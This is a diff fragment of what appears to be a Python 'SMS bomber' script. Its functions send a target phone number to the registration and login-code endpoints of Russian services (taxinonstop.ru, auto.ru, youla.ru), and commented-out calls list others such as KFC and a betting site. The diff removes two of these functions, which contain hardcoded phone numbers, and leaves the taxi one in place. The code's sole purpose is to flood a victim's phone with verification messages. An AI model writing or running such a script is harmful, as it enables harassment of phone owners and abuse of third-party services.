@@ -92,16 +92,7 @@ def taxinonstop(phone):
     response_taxinonstop = requests.post(url='https://taxinonstop.ru/dist/backend/register.php', json={"cmd":"register","phone":phone,"taxi_city":"tmn"})
     print(response_taxinonstop)
 
-def autoru():
-    response_autoru = requests.post(url='https://auth.auto.ru/ajax/', json={"items":{"path":"auth/login-or-register","params":{"phone":"89301237945","retpath":"https://auto.ru/"}}})
-    print(response_autoru.content)
 
-def youla():
-    headers = {
-        'phone':'79301237946'
-    }
-    response_youla = requests.post(url='https://youla.ru/web-api/auth/request_code', headers=headers)
-    print(response_youla)
 
 # pizzalarenzo(phone)
 # tarelochka(phone)
@@ -111,7 +102,7 @@ def youla():
 # ipizza()
 # sunlight()
 # bk()
-# olimpbet
+# olimpbet()
 # kfc()
 # taxinonstop(phone)
-youla()
+# test commit
